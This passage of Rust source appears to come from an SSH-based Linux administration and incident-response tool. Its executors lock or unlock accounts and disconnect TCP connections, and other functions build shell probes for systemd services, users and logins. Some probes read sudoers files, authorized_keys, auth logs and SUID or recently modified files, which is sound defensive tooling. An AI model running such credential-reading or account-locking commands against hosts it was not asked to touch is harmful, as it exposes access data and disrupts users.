        Ok(ExecutionReceipt {
            summary: format!(
                "{} {} from snapshot {}: {dispatch_summary}",
                self.plan.action.label(),
                self.plan.snapshot.username,
                user_account_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?;
        for _ in 0..20 {
            if observed.as_ref().is_some_and(|snapshot| {
                same_user_account_identity(snapshot, &self.plan.snapshot)
                    && user_account_action_verified(snapshot, self.plan.action)
            }) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .user_account_snapshot(self.session, &self.plan.snapshot.username)
                .await?;
        }
        let passed = observed.as_ref().is_some_and(|snapshot| {
            same_user_account_identity(snapshot, &self.plan.snapshot)
                && user_account_action_verified(snapshot, self.plan.action)
        });
        Ok(VerificationResult {
            passed,
            detail: match observed {
                Some(snapshot) => format!(
                    "user {} is {} after {}{}",
                    snapshot.username,
                    snapshot.password_state.label(),
                    self.plan.action.label(),
                    if passed {
                        " (verified)"
                    } else {
                        " (not verified)"
                    },
                ),
                None => format!(
                    "user {} disappeared while verifying {}",
                    self.plan.snapshot.username,
                    self.plan.action.label(),
                ),
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: self.plan.snapshot.username.clone(),
            })?;
        if !same_user_account_identity(&observed, &self.plan.snapshot) {
            return Err(CoreError::validation(
                "user account restore",
                "refusing to restore because the account identity changed",
            ));
        }
        if observed.password_state == self.plan.snapshot.password_state {
            return Ok(());
        }
        if !user_account_action_verified(&observed, self.plan.action) {
            return Err(CoreError::validation(
                "user account restore",
                "refusing to overwrite an unexpected password lock state",
            ));
        }
        let restore_action = match self.plan.action {
            UserAccountAction::Lock => UserAccountAction::Unlock,
            UserAccountAction::Unlock => UserAccountAction::Lock,
        };
        let output = self
            .service
            .ssh
            .execute_bound(
                self.session,
                user_account_command(&self.plan.snapshot.username, restore_action),
                Duration::from_secs(20),
            )
            .await?;
        if output.timed_out || output.exit_code != Some(0) {
            return Err(command_failed("user account restore", &output));
        }
        let restored = self
            .service
            .user_account_snapshot(self.session, &self.plan.snapshot.username)
            .await?
            .ok_or_else(|| CoreError::NotFound {
                entity: "user account",
                id: self.plan.snapshot.username.clone(),
            })?;
        if !same_user_account_identity(&restored, &self.plan.snapshot)
            || restored.password_state != self.plan.snapshot.password_state
        {
            return Err(CoreError::validation(
                "user account restore",
                "the original account lock state was not restored",
            ));
        }
        Ok(())
    }
}

#[derive(Debug)]
struct NetworkDisconnectExecutor<'a> {
    service: &'a SystemInfoService,
    session: &'a BoundSshSession,
    plan: &'a NetworkDisconnectPlan,
}

impl NetworkDisconnectExecutor<'_> {
    fn ensure_plan(&self, operation: &OperationPlan) -> CoreResult<()> {
        if operation.id != self.plan.operation.id || operation.target != self.plan.operation.target
        {
            return Err(CoreError::validation(
                "network disconnect operation",
                "executor is bound to a different immutable plan",
            ));
        }
        Ok(())
    }
}

#[async_trait]
impl OperationExecutor for NetworkDisconnectExecutor<'_> {
    async fn execute(&self, operation: &OperationPlan) -> CoreResult<ExecutionReceipt> {
        self.ensure_plan(operation)?;
        let observed = self
            .service
            .network_connection_snapshot(self.session, &self.plan.identity)
            .await?;
        if observed.as_ref() != Some(&self.plan.snapshot) {
            return Err(CoreError::validation(
                "network disconnect precondition",
                "the connection identity changed after confirmation was prepared",
            ));
        }
        self.service.target.validate(&self.plan.operation.target)?;
        let dispatch_summary = match self
            .service
            .ssh
            .execute_bound(
                self.session,
                network_disconnect_command(&self.plan.identity)?,
                Duration::from_secs(10),
            )
            .await
        {
            Ok(output) if !output.timed_out && output.exit_code == Some(0) => "accepted".to_owned(),
            Ok(output) if output.timed_out => "indeterminate-timeout".to_owned(),
            Ok(output) => format!("rejected-exit-{:?}", output.exit_code),
            Err(error) => format!("indeterminate-{}", bounded_text(&error.to_string(), 256)),
        };
        Ok(ExecutionReceipt {
            summary: format!(
                "disconnect {} -> {} from snapshot {}: {dispatch_summary}",
                self.plan.snapshot.local_display,
                self.plan.snapshot.remote_display,
                network_snapshot_sha256(&self.plan.snapshot),
            ),
            restore_token: None,
        })
    }

    async fn verify(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<VerificationResult> {
        self.ensure_plan(operation)?;
        let mut observed = self
            .service
            .network_connection_snapshot(self.session, &self.plan.identity)
            .await?;
        for _ in 0..20 {
            if observed.as_ref() != Some(&self.plan.snapshot) {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
            observed = self
                .service
                .network_connection_snapshot(self.session, &self.plan.identity)
                .await?;
        }
        let passed = observed.as_ref() != Some(&self.plan.snapshot);
        Ok(VerificationResult {
            passed,
            detail: if passed {
                format!(
                    "connection {} -> {} no longer has the confirmed identity",
                    self.plan.snapshot.local_display, self.plan.snapshot.remote_display
                )
            } else {
                format!(
                    "connection {} -> {} still has the confirmed identity",
                    self.plan.snapshot.local_display, self.plan.snapshot.remote_display
                )
            },
        })
    }

    async fn restore(
        &self,
        operation: &OperationPlan,
        _receipt: &ExecutionReceipt,
    ) -> CoreResult<()> {
        self.ensure_plan(operation)?;
        Err(CoreError::validation(
            "network disconnect restore",
            "terminated TCP connections cannot be restored",
        ))
    }
}

fn bounded_process_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_PROCESS_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_PROCESS_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn bounded_service_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_SERVICE_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_SERVICE_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn service_investigation_command(unit: &str, action: ServiceInvestigationAction) -> String {
    let unit = shq(unit);
    let probe = match action {
        ServiceInvestigationAction::Status => "systemctl status --no-pager -l -- \"$n\"",
        ServiceInvestigationAction::Configuration => "systemctl cat --no-pager -- \"$n\"",
        ServiceInvestigationAction::Details => "systemctl show --no-pager -- \"$n\"",
        ServiceInvestigationAction::Logs => {
            "journalctl -u \"$n\" -n 100 --no-pager --output=short-iso"
        }
        ServiceInvestigationAction::ErrorLogs => {
            "journalctl -u \"$n\" -p err -n 50 --no-pager --output=short-iso"
        }
        ServiceInvestigationAction::LiveLogs => {
            "if command -v timeout >/dev/null 2>&1; then timeout -s INT 8 journalctl -u \"$n\" -n 20 -f --no-pager --output=short-iso; code=$?; [ \"$code\" -eq 0 ] || [ \"$code\" -eq 124 ] || [ \"$code\" -eq 130 ]; else journalctl -u \"$n\" -n 100 --no-pager --output=short-iso; fi"
        }
        ServiceInvestigationAction::Dependencies => {
            "systemctl list-dependencies --no-pager --all -- \"$n\""
        }
        ServiceInvestigationAction::ReverseDependencies => {
            "systemctl list-dependencies --no-pager --all --reverse -- \"$n\""
        }
        ServiceInvestigationAction::ServiceTree => {
            "printf 'Dependencies\\n'; systemctl list-dependencies --no-pager --all -- \"$n\"; printf '\\nReverse dependencies\\n'; systemctl list-dependencies --no-pager --all --reverse -- \"$n\""
        }
        ServiceInvestigationAction::CpuUsage => {
            "systemctl show --no-pager --property=CPUAccounting,CPUUsageNSec,CPUQuotaPerSecUSec,CPUWeight,TasksCurrent,TasksMax -- \"$n\""
        }
        ServiceInvestigationAction::MemoryUsage => {
            "systemctl show --no-pager --property=MemoryAccounting,MemoryCurrent,MemoryPeak,MemoryLimit,MemoryMax,MemoryHigh,MemorySwapCurrent -- \"$n\""
        }
        ServiceInvestigationAction::ProcessList => {
            "cg=$(systemctl show --property=ControlGroup -- \"$n\" 2>/dev/null | sed -n 's/^ControlGroup=//p'); if [ -n \"$cg\" ] && command -v systemd-cgls >/dev/null 2>&1; then systemd-cgls --no-pager \"$cg\"; else pid=$(systemctl show --property=MainPID -- \"$n\" 2>/dev/null | sed -n 's/^MainPID=//p'); case \"$pid\" in ''|*[!0-9]*|0) printf 'No running process\\n';; *) ps -o pid=,ppid=,user=,stat=,pcpu=,pmem=,args= -p \"$pid\" --ppid \"$pid\" 2>/dev/null;; esac; fi"
        }
        ServiceInvestigationAction::OpenFiles => {
            "pid=$(systemctl show --property=MainPID -- \"$n\" 2>/dev/null | sed -n 's/^MainPID=//p'); case \"$pid\" in ''|*[!0-9]*|0) printf 'No running process\\n';; *) if command -v lsof >/dev/null 2>&1; then lsof -nP -p \"$pid\" 2>/dev/null | head -n 200; else find \"/proc/$pid/fd\" -mindepth 1 -maxdepth 1 -printf '%f\\n' 2>/dev/null | sort -n | head -n 100 | while read -r fd; do printf '%s\\t' \"$fd\"; readlink \"/proc/$pid/fd/$fd\" 2>/dev/null; done; fi;; esac"
        }
        ServiceInvestigationAction::RunUser => {
            "systemctl show --no-pager --property=User,Group,DynamicUser,SupplementaryGroups,PAMName -- \"$n\""
        }
        ServiceInvestigationAction::Permissions => {
            "systemctl show --no-pager --property=User,Group,SupplementaryGroups,UMask,CapabilityBoundingSet,AmbientCapabilities,NoNewPrivileges,PermissionsStartOnly -- \"$n\""
        }
        ServiceInvestigationAction::SecurityCheck => {
            "systemctl show --no-pager --property=NoNewPrivileges,PrivateTmp,PrivateDevices,PrivateNetwork,ProtectSystem,ProtectHome,ProtectKernelTunables,ProtectKernelModules,ProtectControlGroups,RestrictAddressFamilies,RestrictNamespaces,LockPersonality,MemoryDenyWriteExecute,CapabilityBoundingSet,AmbientCapabilities,SystemCallFilter -- \"$n\""
        }
        ServiceInvestigationAction::ServiceFile => {
            "p=$(systemctl show --property=FragmentPath -- \"$n\" 2>/dev/null | sed -n 's/^FragmentPath=//p'); case \"$p\" in /*) printf 'Path\\t%s\\n' \"$p\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nModified\\t%y' -- \"$p\" 2>/dev/null; printf '\\nContent\\n'; sed -n '1,400p' -- \"$p\";; *) printf 'No absolute fragment path\\n';; esac"
        }
        ServiceInvestigationAction::Timers => {
            "systemctl show --no-pager --property=Triggers,TriggeredBy -- \"$n\"; printf '\\nMatching timers\\n'; systemctl list-timers --all --no-pager 2>/dev/null | grep -F -- \"$n\" || true"
        }
        ServiceInvestigationAction::Environment => {
            "systemctl show --no-pager --property=Environment,EnvironmentFiles,PassEnvironment,UnsetEnvironment -- \"$n\""
        }
    };
    format!("n={unit}; {probe}")
}

fn service_snapshot_command(unit: &str) -> String {
    let unit = shq(unit);
    format!(
        "n={unit}; systemctl show --no-pager --property=LoadState,ActiveState,SubState,UnitFileState,MainPID,FragmentPath,CanReload -- \"$n\""
    )
}

fn suid_snapshot_command(path: &RemotePath) -> String {
    let path = shq(path.as_str());
    format!(
        "p={path}; [ -f \"$p\" ] && [ ! -L \"$p\" ] || exit 44; sha=$(sha256sum -- \"$p\" 2>/dev/null | awk '{{print $1}}') || exit 45; stat -Lc \"$sha\\t%a\\t%u\\t%g\\t%s\\t%d\\t%i\" -- \"$p\""
    )
}

fn parse_suid_snapshot(path: &RemotePath, output: &str) -> CoreResult<SuidFileSnapshot> {
    let fields = output.trim_end().split('\t').collect::<Vec<_>>();
    if fields.len() != 7 || !is_sha256_text(fields[0]) {
        return Err(CoreError::validation(
            "SUID file snapshot",
            "remote output did not contain the exact snapshot schema",
        ));
    }
    let parse_u32 = |value: &str, subject: &'static str| {
        value
            .parse::<u32>()
            .map_err(|_| CoreError::validation("SUID file snapshot", format!("invalid {subject}")))
    };
    let parse_u64 = |value: &str, subject: &'static str| {
        value
            .parse::<u64>()
            .map_err(|_| CoreError::validation("SUID file snapshot", format!("invalid {subject}")))
    };
    let mode = validated_octal_mode(fields[1])?;
    Ok(SuidFileSnapshot {
        path: path.clone(),
        sha256: fields[0].to_owned(),
        mode,
        uid: parse_u32(fields[2], "UID")?,
        gid: parse_u32(fields[3], "GID")?,
        size: parse_u64(fields[4], "size")?,
        device: parse_u64(fields[5], "device")?,
        inode: parse_u64(fields[6], "inode")?,
    })
}

fn is_sha256_text(value: &str) -> bool {
    value.len() == 64
        && value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

fn parse_service_snapshot(unit: &str, output: &str) -> CoreResult<ServiceStateSnapshot> {
    if !is_valid_unit_name(unit) {
        return Err(invalid_detail_key("systemd unit name"));
    }
    let values: BTreeMap<_, _> = output
        .lines()
        .filter_map(|line| line.split_once('='))
        .collect();
    let required_state = |key: &'static str| -> CoreResult<String> {
        values
            .get(key)
            .copied()
            .filter(|value| is_valid_service_state(value, false))
            .map(ToOwned::to_owned)
            .ok_or_else(|| invalid_detail_key(key))
    };
    let optional_state = |key: &'static str| -> CoreResult<String> {
        values
            .get(key)
            .copied()
            .filter(|value| is_valid_service_state(value, true))
            .map(ToOwned::to_owned)
            .ok_or_else(|| invalid_detail_key(key))
    };
    let load_state = required_state("LoadState")?;
    if load_state == "not-found" {
        return Err(CoreError::NotFound {
            entity: "systemd unit",
            id: unit.to_owned(),
        });
    }
    let main_pid = values
        .get("MainPID")
        .copied()
        .filter(|value| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit()))
        .ok_or_else(|| invalid_detail_key("MainPID"))?
        .parse()
        .map_err(|_| invalid_detail_key("MainPID"))?;
    let fragment_path = values
        .get("FragmentPath")
        .copied()
        .filter(|value| {
            value.is_empty()
                || (value.starts_with('/')
                    && value.len() <= MAX_CELL_CHARS
                    && !value.chars().any(char::is_control))
        })
        .ok_or_else(|| invalid_detail_key("FragmentPath"))?
        .to_owned();
    let can_reload = match values.get("CanReload").copied() {
        Some("yes") => true,
        Some("no") => false,
        _ => return Err(invalid_detail_key("CanReload")),
    };
    Ok(ServiceStateSnapshot {
        unit: unit.to_owned(),
        load_state,
        active_state: required_state("ActiveState")?,
        sub_state: required_state("SubState")?,
        unit_file_state: optional_state("UnitFileState")?,
        main_pid,
        fragment_path,
        can_reload,
    })
}

fn is_valid_service_state(value: &str, allow_empty: bool) -> bool {
    (allow_empty || !value.is_empty())
        && value.len() <= 64
        && value.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.' | b'@' | b':')
        })
}

fn validate_service_runtime_precondition(
    snapshot: &ServiceStateSnapshot,
    action: ServiceRuntimeAction,
) -> CoreResult<()> {
    if snapshot.load_state != "loaded" {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!("{} is not a loaded systemd unit", snapshot.unit),
        ));
    }
    let valid = match action {
        ServiceRuntimeAction::Start => snapshot.active_state != "active",
        ServiceRuntimeAction::Stop
        | ServiceRuntimeAction::Restart
        | ServiceRuntimeAction::Reload => snapshot.active_state == "active",
        ServiceRuntimeAction::Enable => snapshot.unit_file_state == "disabled",
        ServiceRuntimeAction::Disable => snapshot.unit_file_state == "enabled",
        ServiceRuntimeAction::Mask => matches!(
            snapshot.unit_file_state.as_str(),
            "disabled" | "static" | "indirect"
        ),
    };
    if !valid {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!(
                "{} cannot {} from {} / {} / {}",
                snapshot.unit,
                action.command(),
                snapshot.active_state,
                snapshot.sub_state,
                snapshot.unit_file_state,
            ),
        ));
    }
    if action == ServiceRuntimeAction::Reload && !snapshot.can_reload {
        return Err(CoreError::validation(
            "service runtime precondition",
            format!("{} does not advertise reload support", snapshot.unit),
        ));
    }
    Ok(())
}

fn service_runtime_verified(snapshot: &ServiceStateSnapshot, action: ServiceRuntimeAction) -> bool {
    match action {
        ServiceRuntimeAction::Start
        | ServiceRuntimeAction::Restart
        | ServiceRuntimeAction::Reload => snapshot.active_state == "active",
        ServiceRuntimeAction::Stop => snapshot.active_state != "active",
        ServiceRuntimeAction::Enable => snapshot.unit_file_state == "enabled",
        ServiceRuntimeAction::Disable => snapshot.unit_file_state == "disabled",
        ServiceRuntimeAction::Mask => snapshot.unit_file_state == "masked",
    }
}

fn service_snapshot_sha256(snapshot: &ServiceStateSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.unit.as_str(),
        snapshot.load_state.as_str(),
        snapshot.active_state.as_str(),
        snapshot.sub_state.as_str(),
        snapshot.unit_file_state.as_str(),
        snapshot.fragment_path.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    digest.update(snapshot.main_pid.to_be_bytes());
    digest.update([u8::from(snapshot.can_reload)]);
    format!("{:x}", digest.finalize())
}

fn bounded_user_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_USER_INVESTIGATION_CHARS)
}

fn bounded_login_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_LOGIN_INVESTIGATION_CHARS)
}

fn bounded_artifact_output(output: &str) -> (String, bool) {
    bounded_investigation_output(output, MAX_ARTIFACT_INVESTIGATION_CHARS)
}

fn bounded_investigation_output(output: &str, maximum_bytes: usize) -> (String, bool) {
    if output.len() <= maximum_bytes {
        return (output.to_owned(), false);
    }
    let mut end = maximum_bytes;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn user_identity_from_table(table: &SystemInfoTable, row_id: &str) -> CoreResult<UserIdentity> {
    if table.tab != SystemInfoTab::Users {
        return Err(CoreError::validation(
            "user investigation",
            "the selected row is not from the user inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let username = cell(0, "Linux username")?;
    if !is_valid_username(username) {
        return Err(invalid_detail_key("Linux username"));
    }
    let parse_id = |value: &str, subject: &'static str| -> CoreResult<u32> {
        value
            .parse::<u32>()
            .map_err(|_| invalid_detail_key(subject))
    };
    let home = validated_absolute_path(cell(3, "user home directory")?)?;
    let shell = cell(4, "user shell")?;
    let shell = if shell.is_empty() {
        String::new()
    } else {
        validated_absolute_path(shell)?
    };
    Ok(UserIdentity {
        row_id: row.id.clone(),
        username: username.to_owned(),
        uid: parse_id(cell(1, "user UID")?, "user UID")?,
        gid: parse_id(cell(2, "user GID")?, "user GID")?,
        home,
        shell,
    })
}

fn login_identity_from_table(table: &SystemInfoTable, row_id: &str) -> CoreResult<LoginIdentity> {
    if table.tab != SystemInfoTab::LoginHistory {
        return Err(CoreError::validation(
            "login-history investigation",
            "the selected row is not from the login-history inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let username = cell(0, "login username")?;
    if !is_valid_username(username) {
        return Err(invalid_detail_key("login username"));
    }
    let source_text = cell(2, "login source IP")?.trim();
    let source = if source_text.is_empty() || source_text == "-" {
        None
    } else {
        let source = source_text
            .parse::<IpAddr>()
            .map_err(|_| invalid_detail_key("login source IP"))?;
        (!source.is_unspecified()).then_some(source)
    };
    Ok(LoginIdentity {
        row_id: row.id.clone(),
        username: username.to_owned(),
        terminal: validated_plain_field(cell(1, "login terminal")?, 256, true)?,
        source,
        login_time: validated_plain_field(cell(3, "login time")?, 512, true)?,
        status: validated_plain_field(cell(4, "login status")?, 128, true)?,
    })
}

fn validated_plain_field(
    value: &str,
    maximum_chars: usize,
    allow_empty: bool,
) -> CoreResult<String> {
    if (!allow_empty && value.is_empty())
        || value.chars().count() > maximum_chars
        || value.chars().any(char::is_control)
    {
        return Err(invalid_detail_key("plain text field"));
    }
    Ok(value.to_owned())
}

fn user_investigation_command(username: &str, action: UserInvestigationAction) -> String {
    let username = shq(username);
    let home = "h=$(getent passwd \"$u\" 2>/dev/null | cut -d: -f6); case \"$h\" in /*) ;; *) printf 'No valid absolute home directory\\n'; exit 45;; esac;";
    let probe = match action {
        UserInvestigationAction::Details => {
            "printf 'Identity\\n'; id \"$u\" 2>/dev/null; printf '\\nAccount\\n'; getent passwd \"$u\" 2>/dev/null; printf '\\nPassword policy\\n'; chage -l \"$u\" 2>/dev/null || printf 'Password policy is unavailable\\n'".to_owned()
        }
        UserInvestigationAction::Groups | UserInvestigationAction::GroupMembership => {
            "printf 'Groups\\n'; id -nG \"$u\" 2>/dev/null; printf '\\nDetailed identity\\n'; id \"$u\" 2>/dev/null".to_owned()
        }
        UserInvestigationAction::HomeDirectory => format!(
            "{home} printf 'Home\\t%s\\n' \"$h\"; stat -c 'Mode\\t%A (%a)%nOwner\\t%U (%u)%nGroup\\t%G (%g)%nModified\\t%y' -- \"$h\" 2>/dev/null || true; printf 'Disk usage\\t'; du -sh -- \"$h\" 2>/dev/null | cut -f1 || printf 'unavailable\\n'"
        ),
        UserInvestigationAction::PasswordExpiry => {
            "chage -l \"$u\" 2>/dev/null || printf 'Password expiry information is unavailable\\n'".to_owned()
        }
        UserInvestigationAction::AccountStatus => {
            "printf 'Password status\\n'; passwd -S \"$u\" 2>/dev/null || printf 'Password status is unavailable\\n'; printf '\\nLast login\\n'; lastlog -u \"$u\" 2>/dev/null || true".to_owned()
        }
        UserInvestigationAction::SudoPermissions => {
            "printf 'Effective sudo permissions\\n'; sudo -nl -U \"$u\" 2>/dev/null || printf 'No non-interactive sudo result\\n'; printf '\\nMatching sudoers lines\\n'; for f in /etc/sudoers /etc/sudoers.d/*; do [ -f \"$f\" ] || continue; awk -v u=\"$u\" 'NF && $1 !~ /^#/ && index($0,u) {print FILENAME \":\" NR \":\" $0}' \"$f\" 2>/dev/null; done | head -n 100".to_owned()
        }
        UserInvestigationAction::SshKeys => format!(
            "{home} printf 'Authorized keys\\n'; if [ -r \"$h/.ssh/authorized_keys\" ]; then awk 'NF>=2 && $1 !~ /^#/ {{print NR \":\" $1 \" \" substr($2,1,24) \"…\"}}' \"$h/.ssh/authorized_keys\" 2>/dev/null | head -n 100; else printf 'none or unreadable\\n'; fi; printf '\\nPrivate-key file metadata (contents are never read)\\n'; find \"$h/.ssh\" -maxdepth 1 -type f -name 'id_*' ! -name '*.pub' -printf '%f\\t%m\\t%u\\t%s bytes\\n' 2>/dev/null | head -n 50"
        ),
        UserInvestigationAction::LoginHistory => {
            "last -Faiw \"$u\" -n 20 2>/dev/null || printf 'No login history\\n'".to_owned()
        }
        UserInvestigationAction::CurrentSessions => {
            "who 2>/dev/null | awk -v u=\"$u\" '$1==u' | head -n 100; printf '\\nSession count\\t'; who 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}'".to_owned()
        }
        UserInvestigationAction::FailedLogins => {
            "if command -v lastb >/dev/null 2>&1; then lastb \"$u\" -n 20 2>/dev/null || true; fi; for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | grep -i 'fail' | tail -n 20; done".to_owned()
        }
        UserInvestigationAction::LastLogin => {
            "lastlog -u \"$u\" 2>/dev/null || last -Faiw \"$u\" -n 1 2>/dev/null || printf 'No login record\\n'".to_owned()
        }
        UserInvestigationAction::Processes => {
            "ps -u \"$u\" -o pid=,ppid=,pcpu=,pmem=,vsz=,rss=,tty=,stat=,lstart=,time=,args= 2>/dev/null | head -n 200 || true".to_owned()
        }
        UserInvestigationAction::DiskUsage => format!(
            "{home} printf 'Home usage\\n'; du -sh -- \"$h\" 2>/dev/null || true; printf '\\nLargest first-level entries\\n'; du -h --max-depth=1 -- \"$h\" 2>/dev/null | sort -hr | head -n 20 || true"
        ),
        UserInvestigationAction::OpenFiles => {
            "if command -v lsof >/dev/null 2>&1; then lsof -nP -u \"$u\" 2>/dev/null | head -n 200; else printf 'lsof is not installed\\n'; fi".to_owned()
        }
        UserInvestigationAction::AbnormalLogin => {
            "printf 'Recent login origins and times\\n'; last -Faiw \"$u\" 2>/dev/null | head -n 50; printf '\\nOff-hours heuristic (00:00-06:59)\\n'; last -Faiw \"$u\" 2>/dev/null | awk '$0 ~ / (0[0-6]):[0-5][0-9]/' | head -n 20".to_owned()
        }
        UserInvestigationAction::Crontab => {
            "printf 'User crontab\\n'; crontab -u \"$u\" -l 2>/dev/null || printf 'none or unreadable\\n'; printf '\\nSystem cron references\\n'; for f in /etc/crontab /etc/cron.d/*; do [ -f \"$f\" ] || continue; grep -Fn -- \"$u\" \"$f\" 2>/dev/null | sed \"s#^#$f:#\"; done | head -n 100".to_owned()
        }
        UserInvestigationAction::SshConfig => format!(
            "{home} printf 'SSH client config\\n'; sed -n '1,300p' -- \"$h/.ssh/config\" 2>/dev/null || printf 'none or unreadable\\n'; printf '\\nKnown-host entry count\\t'; awk 'NF && $1 !~ /^#/ {{n++}} END {{print n+0}}' \"$h/.ssh/known_hosts\" 2>/dev/null"
        ),
        UserInvestigationAction::SuspiciousFiles => format!(
            "{home} printf 'Hidden files (depth <= 4)\\n'; find \"$h\" -xdev -maxdepth 4 -type f -name '.*' -print 2>/dev/null | head -n 50; printf '\\nFiles modified in the last 7 days\\n'; find \"$h\" -xdev -maxdepth 5 -type f -mtime -7 -printf '%TY-%Tm-%TdT%TH:%TM:%TS\\t%p\\n' 2>/dev/null | head -n 100"
        ),
        UserInvestigationAction::SuidFiles => format!(
            "{home} find \"$h\" -xdev -type f \\( -perm -4000 -o -perm -2000 \\) -printf '%m\\t%u:%g\\t%p\\n' 2>/dev/null | head -n 100"
        ),
    };
    format!(
        "u={username}; if ! getent passwd \"$u\" >/dev/null 2>&1; then printf 'User no longer exists\\n'; exit 44; fi; {probe}"
    )
}

fn login_investigation_command(
    identity: &LoginIdentity,
    action: LoginInvestigationAction,
) -> CoreResult<String> {
    if action.requires_source() && identity.source.is_none() {
        return Err(CoreError::validation(
            "login-history investigation",
            "the selected row does not contain a validated source IP address",
        ));
    }
    let username = shq(&identity.username);
    let source = identity.source.map(|ip| shq(&ip.to_string()));
    let probe = match action {
        LoginInvestigationAction::UserDetails => {
            "id \"$u\" 2>/dev/null; printf '\\nAccount\\n'; getent passwd \"$u\" 2>/dev/null; printf '\\nPassword policy\\n'; chage -l \"$u\" 2>/dev/null || true".to_owned()
        }
        LoginInvestigationAction::UserLoginCount => {
            "last -Faiw \"$u\" -n 50 2>/dev/null || true; printf '\\nTotal retained records\\t'; last -Faiw \"$u\" 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}'".to_owned()
        }
        LoginInvestigationAction::UserFailedCount => {
            "if command -v lastb >/dev/null 2>&1; then lastb \"$u\" -n 50 2>/dev/null || true; printf '\\nTotal retained failures\\t'; lastb \"$u\" 2>/dev/null | awk -v u=\"$u\" '$1==u {n++} END {print n+0}'; else printf 'lastb is unavailable\\n'; fi".to_owned()
        }
        LoginInvestigationAction::UserSudoHistory => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | grep -F 'sudo' | tail -n 50; done; journalctl _COMM=sudo -n 500 --no-pager 2>/dev/null | grep -F -- \"$u\" | tail -n 50 || true".to_owned()
        }
        LoginInvestigationAction::SourceLogins => format!(
            "ip={}; last -Faiw 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::Whois => format!(
            "ip={}; if command -v whois >/dev/null 2>&1; then whois -- \"$ip\" 2>/dev/null | head -n 100 || printf 'WHOIS query failed\\n'; else printf 'whois is not installed\\n'; fi",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::ReverseDns => format!(
            "ip={}; getent hosts \"$ip\" 2>/dev/null || (command -v dig >/dev/null 2>&1 && dig -x \"$ip\" +short 2>/dev/null) || (command -v nslookup >/dev/null 2>&1 && nslookup \"$ip\" 2>/dev/null) || printf 'No reverse DNS result\\n'",
            source.as_deref().expect("validated source IP")
        ),
        LoginInvestigationAction::AuthLogs => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F -- \"$u\" \"$f\" 2>/dev/null | tail -n 100; done; journalctl -u sshd -u ssh -n 500 --no-pager 2>/dev/null | grep -F -- \"$u\" | tail -n 100 || true".to_owned()
        }
        LoginInvestigationAction::RecentFailures => {
            "if command -v lastb >/dev/null 2>&1; then lastb -Faiw -n 50 2>/dev/null || true; else printf 'lastb is unavailable\\n'; fi".to_owned()
        }
        LoginInvestigationAction::BruteForceCheck => {
            "for f in /var/log/auth.log /var/log/secure; do [ -r \"$f\" ] || continue; grep -F 'Failed password' \"$f\" 2>/dev/null; done | sed -n 's/^.* from \\([^ ]*\\) port .*$/\\1/p' | sort | uniq -c | sort -rn | head -n 30".to_owned()
        }
    };
    let current_user_guard = if action.requires_current_user() {
        "if ! getent passwd \"$u\" >/dev/null 2>&1; then printf 'User no longer exists\\n'; exit 44; fi; "
    } else {
        ""
    };
    Ok(format!("u={username}; {current_user_guard}{probe}"))
}

fn artifact_investigation_command(
    identity: &ArtifactIdentity,
    action: ArtifactInvestigationAction,
) -> CoreResult<String> {
    match (identity, action) {
